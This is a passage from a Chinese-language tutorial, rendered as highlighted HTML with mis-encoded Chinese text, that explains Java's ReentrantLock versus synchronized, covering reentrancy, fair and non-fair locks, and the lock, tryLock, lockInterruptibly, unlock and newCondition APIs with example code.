    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">cannotTryLock</span><span class="hljs-params">()</span> {
        <span class="hljs-comment">// æ— æ³•å®ç°ï¼šå¦‚æœé”å¯ç”¨å°±è·å–ï¼Œå¦åˆ™ç«‹å³è¿”å›</span>
        <span class="hljs-keyword">synchronized</span> (lock) {
            <span class="hljs-comment">// ...</span>
        }
    }
    
    <span class="hljs-comment">/**
     * å±€é™4ï¼šåªæ”¯æŒå•ä¸€æ¡ä»¶
     * Objectçš„wait/notifyåªèƒ½æœ‰ä¸€ä¸ªç­‰å¾…é›†åˆ
     */</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">singleCondition</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> InterruptedException {
        <span class="hljs-keyword">synchronized</span> (lock) {
            <span class="hljs-comment">// åªèƒ½è°ƒç”¨ lock.wait()ï¼Œæ‰€æœ‰ç­‰å¾…çº¿ç¨‹å…±ç”¨ä¸€ä¸ªé˜Ÿåˆ—</span>
            <span class="hljs-comment">// æ— æ³•åŒºåˆ†"ç­‰å¾…ç©ºé—´"å’Œ"ç­‰å¾…æ•°æ®"çš„çº¿ç¨‹</span>
            lock.wait();
        }
    }
    
    <span class="hljs-comment">/**
     * å±€é™5ï¼šæ— æ³•æŸ¥è¯¢é”çŠ¶æ€
     * ä¸çŸ¥é“é”æ˜¯å¦è¢«å…¶ä»–çº¿ç¨‹æŒæœ‰
     */</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">cannotQueryState</span><span class="hljs-params">()</span> {
        <span class="hljs-comment">// æ— æ³•åˆ¤æ–­é”æ˜¯å¦è¢«å ç”¨</span>
        <span class="hljs-comment">// æ— æ³•çŸ¥é“å½“å‰çº¿ç¨‹çš„é‡å…¥æ¬¡æ•°</span>
    }
}
</code></pre>
<h4 data-id="heading-3">1.2 ReentrantLockçš„ä¼˜åŠ¿</h4>
<p><code>ReentrantLock</code>å®Œç¾è§£å†³äº†ä¸Šè¿°æ‰€æœ‰é—®é¢˜ï¼š</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/9f201063f619487c9883935393a1e3bc~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6ZWc6Iqx5rC05pyIbGlueWk=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765767298&amp;x-signature=H0djeUX0bn7yWySLAIPWwGHSibw%3D" alt="synchronized-vs-reentrantlock.drawio.png" loading="lazy"/></p>
<h4 data-id="heading-4">1.3 ä»€ä¹ˆæ—¶å€™é€‰æ‹©ReentrantLock</h4>













































<table><thead><tr><th align="left">åœºæ™¯</th><th align="left">æ¨èé€‰æ‹©</th><th align="left">åŸå› </th></tr></thead><tbody><tr><td align="left">ç®€å•åŒæ­¥ï¼Œæ€§èƒ½è¦æ±‚ä¸é«˜</td><td align="left">synchronized</td><td align="left">è¯­æ³•ç®€å•ï¼Œè‡ªåŠ¨é‡Šæ”¾</td></tr><tr><td align="left">éœ€è¦å¯ä¸­æ–­ç­‰å¾…</td><td align="left">ReentrantLock</td><td align="left">lockInterruptibly()</td></tr><tr><td align="left">éœ€è¦è¶…æ—¶è·å–</td><td align="left">ReentrantLock</td><td align="left">tryLock(timeout)</td></tr><tr><td align="left">éœ€è¦å…¬å¹³é”</td><td align="left">ReentrantLock</td><td align="left">new ReentrantLock(true)</td></tr><tr><td align="left">éœ€è¦å¤šä¸ªç­‰å¾…æ¡ä»¶</td><td align="left">ReentrantLock</td><td align="left">newCondition()</td></tr><tr><td align="left">éœ€è¦æŸ¥è¯¢é”çŠ¶æ€</td><td align="left">ReentrantLock</td><td align="left">isLocked()ç­‰æ–¹æ³•</td></tr><tr><td align="left">é”ç²’åº¦éœ€è¦æ›´ç»†</td><td align="left">ReentrantLock</td><td align="left">æ›´çµæ´»çš„åŠ é”/è§£é”æ§åˆ¶</td></tr></tbody></table>
<hr/>
<h3 data-id="heading-5">2. ReentrantLockæ ¸å¿ƒæ¦‚å¿µ</h3>
<h4 data-id="heading-6">2.1 ä»€ä¹ˆæ˜¯ReentrantLock</h4>
<p><code>ReentrantLock</code>æ˜¯ä¸€ä¸ª<strong>å¯é‡å…¥çš„äº’æ–¥é”</strong>ï¼ˆReentrant Mutual Exclusion Lockï¼‰ã€‚è®©æˆ‘ä»¬æ‹†è§£è¿™ä¸ªå®šä¹‰ï¼š</p>
<ul>
<li><strong>å¯é‡å…¥ï¼ˆReentrantï¼‰</strong>ï¼šåŒä¸€ä¸ªçº¿ç¨‹å¯ä»¥å¤šæ¬¡è·å–åŒä¸€æŠŠé”ï¼Œä¸ä¼šé€ æˆæ­»é”</li>
<li><strong>äº’æ–¥ï¼ˆMutual Exclusionï¼‰</strong>ï¼šåŒä¸€æ—¶åˆ»åªæœ‰ä¸€ä¸ªçº¿ç¨‹èƒ½æŒæœ‰é”</li>
<li><strong>é”ï¼ˆLockï¼‰</strong>ï¼šç”¨äºæ§åˆ¶å¯¹å…±äº«èµ„æºçš„è®¿é—®</li>
</ul>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">/**
 * å¯é‡å…¥ç‰¹æ€§æ¼”ç¤º
 */</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ReentrantDemo</span> {
    
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> <span class="hljs-type">ReentrantLock</span> <span class="hljs-variable">lock</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ReentrantLock</span>();
    
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">outer</span><span class="hljs-params">()</span> {
        lock.lock();  <span class="hljs-comment">// ç¬¬ä¸€æ¬¡è·å–é”ï¼ŒholdCount = 1</span>
        <span class="hljs-keyword">try</span> {
            System.out.println(<span class="hljs-string">"outeræ–¹æ³•è·å–é”"</span>);
            inner();  <span class="hljs-comment">// è°ƒç”¨å†…éƒ¨æ–¹æ³•ï¼Œå†æ¬¡è·å–åŒä¸€æŠŠé”</span>
        } <span class="hljs-keyword">finally</span> {
            lock.unlock();  <span class="hljs-comment">// é‡Šæ”¾é”ï¼ŒholdCount = 0</span>
        }
    }
    
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">inner</span><span class="hljs-params">()</span> {
        lock.lock();  <span class="hljs-comment">// ç¬¬äºŒæ¬¡è·å–é”ï¼ŒholdCount = 2ï¼ˆå¯é‡å…¥ï¼ï¼‰</span>
        <span class="hljs-keyword">try</span> {
            System.out.println(<span class="hljs-string">"inneræ–¹æ³•è·å–é”"</span>);
        } <span class="hljs-keyword">finally</span> {
            lock.unlock();  <span class="hljs-comment">// é‡Šæ”¾é”ï¼ŒholdCount = 1</span>
        }
    }
    
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> {
        <span class="hljs-type">ReentrantDemo</span> <span class="hljs-variable">demo</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ReentrantDemo</span>();
        demo.outer();  <span class="hljs-comment">// ä¸ä¼šæ­»é”ï¼</span>
    }
}
</code></pre>
<h4 data-id="heading-7">2.2 å…¬å¹³é”ä¸éå…¬å¹³é”</h4>
<p><code>ReentrantLock</code>æ”¯æŒä¸¤ç§è·å–é”çš„ç­–ç•¥</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/9dca1eb396394912bde3f55d83c983c5~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6ZWc6Iqx5rC05pyIbGlueWk=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765767298&amp;x-signature=BjhKyioFUHsr43hjz6xclPl0Awg%3D" alt="fair-vs-nonfair-lock.drawio.png" loading="lazy"/></p>
<p><strong>éå…¬å¹³é”</strong>ï¼ˆé»˜è®¤ï¼‰ï¼š</p>
<ul>
<li>æ–°çº¿ç¨‹å¯ä»¥"æ’é˜Ÿ"ï¼Œç›´æ¥å°è¯•è·å–é”</li>
<li>ä¼˜ç‚¹ï¼šååé‡é«˜ï¼Œå‡å°‘çº¿ç¨‹åˆ‡æ¢å¼€é”€</li>
<li>ç¼ºç‚¹ï¼šå¯èƒ½å¯¼è‡´æŸäº›çº¿ç¨‹"é¥¥é¥¿"ï¼ˆé•¿æœŸç­‰å¾…ï¼‰</li>
</ul>
<p><strong>å…¬å¹³é”</strong>ï¼š</p>
<ul>
<li>ä¸¥æ ¼æŒ‰ç…§å…ˆæ¥ååˆ°çš„é¡ºåºè·å–é”</li>
<li>ä¼˜ç‚¹ï¼šæ‰€æœ‰çº¿ç¨‹éƒ½èƒ½å…¬å¹³è·å¾—æ‰§è¡Œæœºä¼š</li>
<li>ç¼ºç‚¹ï¼šååé‡è¾ƒä½ï¼Œéœ€è¦é¢‘ç¹çš„çº¿ç¨‹åˆ‡æ¢</li>
</ul>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// éå…¬å¹³é”ï¼ˆé»˜è®¤ï¼‰</span>
<span class="hljs-type">ReentrantLock</span> <span class="hljs-variable">unfairLock</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ReentrantLock</span>();
<span class="hljs-type">ReentrantLock</span> <span class="hljs-variable">unfairLock2</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ReentrantLock</span>(<span class="hljs-literal">false</span>);

<span class="hljs-comment">// å…¬å¹³é”</span>
<span class="hljs-type">ReentrantLock</span> <span class="hljs-variable">fairLock</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ReentrantLock</span>(<span class="hljs-literal">true</span>);
</code></pre>
<h4 data-id="heading-8">2.3 ç±»ç»“æ„æ¦‚è§ˆ</h4>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/920a0ec7b24e4a9ea7c607b3b990fa1b~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6ZWc6Iqx5rC05pyIbGlueWk=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765767298&amp;x-signature=JiT87vwNMgrS2IG8zUUK0jcbOTg%3D" alt="reentrantlock-class-diagram.drawio.png" loading="lazy"/></p>
<hr/>
<h3 data-id="heading-9">3. åŸºç¡€APIè¯¦è§£</h3>
<h4 data-id="heading-10">3.1 APIæ€»è§ˆ</h4>






















































<table><thead><tr><th align="left">æ–¹æ³•</th><th align="left">è¯´æ˜</th><th align="left">é˜»å¡</th><th align="left">å¯ä¸­æ–­</th><th align="left">å¯è¶…æ—¶</th></tr></thead><tbody><tr><td align="left"><code>lock()</code></td><td align="left">è·å–é”</td><td align="left">âœ…</td><td align="left">âŒ</td><td align="left">âŒ</td></tr><tr><td align="left"><code>lockInterruptibly()</code></td><td align="left">å¯ä¸­æ–­åœ°è·å–é”</td><td align="left">âœ…</td><td align="left">âœ…</td><td align="left">âŒ</td></tr><tr><td align="left"><code>tryLock()</code></td><td align="left">å°è¯•è·å–é”ï¼ˆéé˜»å¡ï¼‰</td><td align="left">âŒ</td><td align="left">-</td><td align="left">-</td></tr><tr><td align="left"><code>tryLock(time, unit)</code></td><td align="left">è¶…æ—¶è·å–é”</td><td align="left">âœ…</td><td align="left">âœ…</td><td align="left">âœ…</td></tr><tr><td align="left"><code>unlock()</code></td><td align="left">é‡Šæ”¾é”</td><td align="left">-</td><td align="left">-</td><td align="left">-</td></tr><tr><td align="left"><code>newCondition()</code></td><td align="left">åˆ›å»ºæ¡ä»¶å˜é‡</td><td align="left">-</td><td align="left">-</td><td align="left">-</td></tr></tbody></table>
<h4 data-id="heading-11">3.2 lock() - è·å–é”</h4>
<p><code>lock()</code>æ˜¯æœ€åŸºæœ¬çš„è·å–é”æ–¹æ³•ã€‚å¦‚æœé”è¢«å…¶ä»–çº¿ç¨‹æŒæœ‰ï¼Œå½“å‰çº¿ç¨‹ä¼šé˜»å¡ç­‰å¾…ï¼Œç›´åˆ°è·å–åˆ°é”ã€‚</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">/**
 * lock()æ–¹æ³•ä½¿ç”¨ç¤ºä¾‹
 */</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">LockExample</span> {
    
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> <span class="hljs-type">ReentrantLock</span> <span class="hljs-variable">lock</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ReentrantLock</span>();
    <span class="hljs-keyword">private</span> <span class="hljs-type">int</span> <span class="hljs-variable">count</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>;
    
    <span class="hljs-comment">/**
     * æ ‡å‡†ä½¿ç”¨æ¨¡å¼ï¼šlock-try-finally-unlock
     */</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">increment</span><span class="hljs-params">()</span> {
        lock.lock();  <span class="hljs-comment">// è·å–é”</span>
        <span class="hljs-keyword">try</span> {
            count++;  <span class="hljs-comment">// ä¸´ç•ŒåŒºä»£ç </span>
        } <span class="hljs-keyword">finally</span> {
            lock.unlock();  <span class="hljs-comment">// å¿…é¡»åœ¨finallyä¸­é‡Šæ”¾é”ï¼</span>
        }
    }
    
    <span class="hljs-comment">/**
     * é”™è¯¯ç¤ºä¾‹ï¼šæ²¡æœ‰åœ¨finallyä¸­é‡Šæ”¾é”
     */</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">wrongUsage</span><span class="hljs-params">()</span> {
        lock.lock();
        count++;
        lock.unlock();  <span class="hljs-comment">// å¦‚æœcount++æŠ›å¼‚å¸¸ï¼Œé”æ°¸è¿œä¸ä¼šé‡Šæ”¾ï¼</span>
    }
}
</code></pre>
<blockquote>
<p><strong>é‡è¦è­¦å‘Šï¼š</strong><code>lock()</code>å’Œ<code>unlock()</code>å¿…é¡»é…å¯¹ä½¿ç”¨ï¼Œä¸”<code>unlock()</code>å¿…é¡»æ”¾åœ¨<code>finally</code>å—ä¸­ï¼Œç¡®ä¿æ— è®ºæ˜¯å¦å‘ç”Ÿå¼‚å¸¸éƒ½èƒ½é‡Šæ”¾é”ã€‚</p>
</blockquote>
<h4 data-id="heading-12">3.3 lockInterruptibly() - å¯ä¸­æ–­è·å–é”</h4>
<p>å½“çº¿ç¨‹åœ¨ç­‰å¾…é”æ—¶ï¼Œå¯ä»¥å“åº”ä¸­æ–­ã€‚è¿™åœ¨éœ€è¦å–æ¶ˆé•¿æ—¶é—´ç­‰å¾…çš„åœºæ™¯éå¸¸æœ‰ç”¨ã€‚</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">/**
 * lockInterruptibly()ä½¿ç”¨ç¤ºä¾‹
 */</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">InterruptibleLockExample</span> {
    
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> <span class="hljs-type">ReentrantLock</span> <span class="hljs-variable">lock</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ReentrantLock</span>();
    
    <span class="hljs-comment">/**
     * å¯ä¸­æ–­çš„è·å–é”
     */</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">interruptibleMethod</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> InterruptedException {
        <span class="hljs-comment">// å¦‚æœçº¿ç¨‹è¢«ä¸­æ–­ï¼Œä¼šæŠ›å‡ºInterruptedException</span>
        lock.lockInterruptibly();
        <span class="hljs-keyword">try</span> {
            <span class="hljs-comment">// æ‰§è¡Œä¸šåŠ¡é€»è¾‘</span>
            doSomething();
        } <span class="hljs-keyword">finally</span> {
            lock.unlock();
        }
    }
    
    <span class="hljs-comment">/**
     * å®é™…åº”ç”¨ï¼šå¯å–æ¶ˆçš„ä»»åŠ¡
     */</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">cancellableTask</span><span class="hljs-params">()</span> {
        <span class="hljs-type">Thread</span> <span class="hljs-variable">worker</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Thread</span>(() -&gt; {
            <span class="hljs-keyword">try</span> {
                lock.lockInterruptibly();
                <span class="hljs-keyword">try</span> {
                    <span class="hljs-comment">// é•¿æ—¶é—´è¿è¡Œçš„ä»»åŠ¡</span>
                    <span class="hljs-keyword">while</span> (!Thread.currentThread().isInterrupted()) {
                        processData();
                    }
                } <span class="hljs-keyword">finally</span> {
                    lock.unlock();
                }
            } <span class="hljs-keyword">catch</span> (InterruptedException e) {
                System.out.println(<span class="hljs-string">"ä»»åŠ¡è¢«å–æ¶ˆ"</span>);
                Thread.currentThread().interrupt();  <span class="hljs-comment">// æ¢å¤ä¸­æ–­çŠ¶æ€</span>
            }
        });
        
        worker.start();
        
        <span class="hljs-comment">// éœ€è¦å–æ¶ˆæ—¶</span>
        <span class="hljs-comment">// worker.interrupt();  // ä¼šä½¿lockInterruptibly()æŠ›å‡ºå¼‚å¸¸</span>
    }
    
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">doSomething</span><span class="hljs-params">()</span> { <span class="hljs-comment">/* ... */</span> }
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">processData</span><span class="hljs-params">()</span> { <span class="hljs-comment">/* ... */</span> }
}
</code></pre>
<h4 data-id="heading-13">3.4 tryLock() - å°è¯•è·å–é”</h4>
<p><code>tryLock()</code>æ˜¯éé˜»å¡çš„è·å–é”æ–¹æ³•ã€‚å¦‚æœé”å¯ç”¨ï¼Œç«‹å³è·å–å¹¶è¿”å›<code>true</code>ï¼›å¦åˆ™ç«‹å³è¿”å›<code>false</code>ã€‚</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">/**
 * tryLock()ä½¿ç”¨ç¤ºä¾‹
 */</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">TryLockExample</span> {
    
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> <span class="hljs-type">ReentrantLock</span> <span class="hljs-variable">lock</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ReentrantLock</span>();
    
    <span class="hljs-comment">/**
     * éé˜»å¡è·å–é”
     */</span>
    <span class="hljs-keyword">public</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">tryProcess</span><span class="hljs-params">()</span> {
        <span class="hljs-keyword">if</span> (lock.tryLock()) {  <span class="hljs-comment">// å°è¯•è·å–é”</span>
            <span class="hljs-keyword">try</span> {
                <span class="hljs-comment">// è·å–æˆåŠŸï¼Œæ‰§è¡Œä¸šåŠ¡é€»è¾‘</span>
                doProcess();
                <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;
            } <span class="hljs-keyword">finally</span> {
                lock.unlock();
            }
        } <span class="hljs-keyword">else</span> {
            <span class="hljs-comment">// è·å–å¤±è´¥ï¼Œæ‰§è¡Œé™çº§é€»è¾‘</span>
            System.out.println(<span class="hljs-string">"é”è¢«å ç”¨ï¼Œæ‰§è¡Œé™çº§æ“ä½œ"</span>);
            <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;
        }
    }
    
    <span class="hljs-comment">/**
     * å®é™…åº”ç”¨ï¼šé¿å…æ­»é”çš„è½¬è´¦æ“ä½œ
     */</span>
    <span class="hljs-keyword">public</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">transfer</span><span class="hljs-params">(Account from, Account to, <span class="hljs-type">int</span> amount)</span> {
        <span class="hljs-comment">// å°è¯•åŒæ—¶è·å–ä¸¤æŠŠé”ï¼Œé¿å…æ­»é”</span>
        <span class="hljs-keyword">while</span> (<span class="hljs-literal">true</span>) {
            <span class="hljs-keyword">if</span> (from.lock.tryLock()) {
                <span class="hljs-keyword">try</span> {
                    <span class="hljs-keyword">if</span> (to.lock.tryLock()) {
                        <span class="hljs-keyword">try</span> {
                            <span class="hljs-comment">// ä¸¤æŠŠé”éƒ½è·å–æˆåŠŸï¼Œæ‰§è¡Œè½¬è´¦</span>
                            from.debit(amount);
                            to.credit(amount);
                            <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;
                        } <span class="hljs-keyword">finally</span> {
                            to.lock.unlock();
                        }
                    }
                } <span class="hljs-keyword">finally</span> {
                    from.lock.unlock();
                }
            }
            <span class="hljs-comment">// è·å–å¤±è´¥ï¼ŒçŸ­æš‚ä¼‘çœ åé‡è¯•</span>
            <span class="hljs-keyword">try</span> {
                Thread.sleep(<span class="hljs-number">10</span>);
            } <span class="hljs-keyword">catch</span> (InterruptedException e) {
                Thread.currentThread().interrupt();
                <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;
            }
        }
    }
    
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">doProcess</span><span class="hljs-params">()</span> { <span class="hljs-comment">/* ... */</span> }
}

<span class="hljs-keyword">class</span> <span class="hljs-title class_">Account</span> {
    <span class="hljs-keyword">final</span> <span class="hljs-type">ReentrantLock</span> <span class="hljs-variable">lock</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ReentrantLock</span>();
    <span class="hljs-keyword">private</span> <span class="hljs-type">int</span> balance;
    
    <span class="hljs-keyword">void</span> <span class="hljs-title function_">debit</span><span class="hljs-params">(<span class="hljs-type">int</span> amount)</span> { balance -= amount; }
    <span class="hljs-keyword">void</span> <span class="hljs-title function_">credit</span><span class="hljs-params">(<span class="hljs-type">int</span> amount)</span> { balance += amount; }
}
</code></pre>
<h4 data-id="heading-14">3.5 tryLock(long time, TimeUnit unit) - è¶…æ—¶è·å–é”</h4>
<p>åœ¨æŒ‡å®šæ—¶é—´å†…å°è¯•è·å–é”ã€‚å¦‚æœåœ¨è¶…æ—¶æ—¶é—´å†…è·å–åˆ°é”ï¼Œè¿”å›<code>true</code>ï¼›å¦åˆ™è¿”å›<code>false</code>ã€‚</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">/**
 * tryLock(timeout)ä½¿ç”¨ç¤ºä¾‹
 */</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">TimeoutLockExample</span> {
    
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> <span class="hljs-type">ReentrantLock</span> <span class="hljs-variable">lock</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ReentrantLock</span>();
    
    <span class="hljs-comment">/**
     * è¶…æ—¶è·å–é”
     */</span>
    <span class="hljs-keyword">public</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">processWithTimeout</span><span class="hljs-params">()</span> {
        <span class="hljs-keyword">try</span> {
            <span class="hljs-comment">// å°è¯•åœ¨3ç§’å†…è·å–é”</span>
            <span class="hljs-keyword">if</span> (lock.tryLock(<span class="hljs-number">3</span>, TimeUnit.SECONDS)) {
                <span class="hljs-keyword">try</span> {
                    doProcess();
                    <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;
                } <span class="hljs-keyword">finally</span> {
                    lock.unlock();
                }
            } <span class="hljs-keyword">else</span> {
                <span class="hljs-comment">// è¶…æ—¶æœªè·å–åˆ°é”</span>
                System.out.println(<span class="hljs-string">"è·å–é”è¶…æ—¶"</span>);
                <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;
            }
        } <span class="hljs-keyword">catch</span> (InterruptedException e) {
            <span class="hljs-comment">// ç­‰å¾…è¿‡ç¨‹ä¸­è¢«ä¸­æ–­</span>
            System.out.println(<span class="hljs-string">"ç­‰å¾…é”æ—¶è¢«ä¸­æ–­"</span>);
            Thread.currentThread().interrupt();
            <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;
        }
    }
    
    <span class="hljs-comment">/**
     * å®é™…åº”ç”¨ï¼šå¸¦è¶…æ—¶çš„åˆ†å¸ƒå¼é”æ¨¡æ‹Ÿ
     */</span>
    <span class="hljs-keyword">public</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">executeWithLock</span><span class="hljs-params">(Runnable task, <span class="hljs-type">long</span> timeout, TimeUnit unit)</span> {
        <span class="hljs-keyword">try</span> {
            <span class="hljs-keyword">if</span> (lock.tryLock(timeout, unit)) {
                <span class="hljs-keyword">try</span> {
                    task.run();
                    <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;
                } <span class="hljs-keyword">finally</span> {
                    lock.unlock();
                }
            }
            <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;
        } <span class="hljs-keyword">catch</span> (InterruptedException e) {
            Thread.currentThread().interrupt();
            <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;
        }
    }
    
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">doProcess</span><span class="hljs-params">()</span> { <span class="hljs-comment">/* ... */</span> }
}
</code></pre>
<h4 data-id="heading-15">3.6 unlock() - é‡Šæ”¾é”</h4>
<p>é‡Šæ”¾é”ï¼Œå°†é”çš„æŒæœ‰è®¡æ•°å‡1ã€‚å½“è®¡æ•°å˜ä¸º0æ—¶ï¼Œé”å®Œå…¨é‡Šæ”¾ï¼Œå…¶ä»–ç­‰å¾…çº¿ç¨‹å¯ä»¥ç«äº‰è·å–ã€‚</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">/**
 * unlock()ä½¿ç”¨ç¤ºä¾‹
 */</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">UnlockExample</span> {
    
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> <span class="hljs-type">ReentrantLock</span> <span class="hljs-variable">lock</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ReentrantLock</span>();
    
    <span class="hljs-comment">/**
     * å¯é‡å…¥åœºæ™¯ä¸‹çš„unlock
     */</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">reentrantExample</span><span class="hljs-params">()</span> {
        lock.lock();  <span class="hljs-comment">// holdCount = 1</span>
        <span class="hljs-keyword">try</span> {
            System.out.println(<span class="hljs-string">"å¤–å±‚é”å®šï¼ŒholdCount = "</span> + lock.getHoldCount());
            
            lock.lock();  <span class="hljs-comment">// holdCount = 2</span>
            <span class="hljs-keyword">try</span> {
                System.out.println(<span class="hljs-string">"å†…å±‚é”å®šï¼ŒholdCount = "</span> + lock.getHoldCount());
            } <span class="hljs-keyword">finally</span> {
                lock.unlock();  <span class="hljs-comment">// holdCount = 1</span>
                System.out.println(<span class="hljs-string">"å†…å±‚é‡Šæ”¾ï¼ŒholdCount = "</span> + lock.getHoldCount());
            }
            
        } <span class="hljs-keyword">finally</span> {
            lock.unlock();  <span class="hljs-comment">// holdCount = 0ï¼Œé”å®Œå…¨é‡Šæ”¾</span>
            System.out.println(<span class="hljs-string">"å¤–å±‚é‡Šæ”¾ï¼ŒholdCount = "</span> + lock.getHoldCount());
        }
    }
    
    <span class="hljs-comment">/**
     *  é”™è¯¯ï¼šéé”æŒæœ‰è€…è°ƒç”¨unlock
     */</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">wrongUnlock</span><span class="hljs-params">()</span> {
        <span class="hljs-comment">// æ²¡æœ‰è·å–é”å°±è°ƒç”¨unlockï¼Œä¼šæŠ›å‡ºIllegalMonitorStateException</span>
        <span class="hljs-keyword">try</span> {
            lock.unlock();  <span class="hljs-comment">//  æŠ›å‡ºå¼‚å¸¸ï¼</span>
        } <span class="hljs-keyword">catch</span> (IllegalMonitorStateException e) {
            System.out.println(<span class="hljs-string">"éé”æŒæœ‰è€…ä¸èƒ½é‡Šæ”¾é”: "</span> + e.getMessage());
        }
    }
}
</code></pre>
<h4 data-id="heading-16">3.7 newCondition() - åˆ›å»ºæ¡ä»¶å˜é‡</h4>
<p>åˆ›å»ºä¸é”å…³è”çš„<code>Condition</code>å¯¹è±¡ï¼Œç”¨äºå®ç°ç­‰å¾…/é€šçŸ¥æœºåˆ¶ã€‚ä¸€æŠŠé”å¯ä»¥åˆ›å»ºå¤šä¸ª<code>Condition</code>ï¼Œè¿™æ˜¯ç›¸æ¯”<code>synchronized</code>çš„é‡è¦ä¼˜åŠ¿ã€‚</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">/**
 * newCondition()ä½¿ç”¨ç¤ºä¾‹
 */</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ConditionExample</span> {
    
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> <span class="hljs-type">ReentrantLock</span> <span class="hljs-variable">lock</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ReentrantLock</span>();
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> <span class="hljs-type">Condition</span> <span class="hljs-variable">notEmpty</span> <span class="hljs-operator">=</span> lock.newCondition();  <span class="hljs-comment">// éç©ºæ¡ä»¶</span>
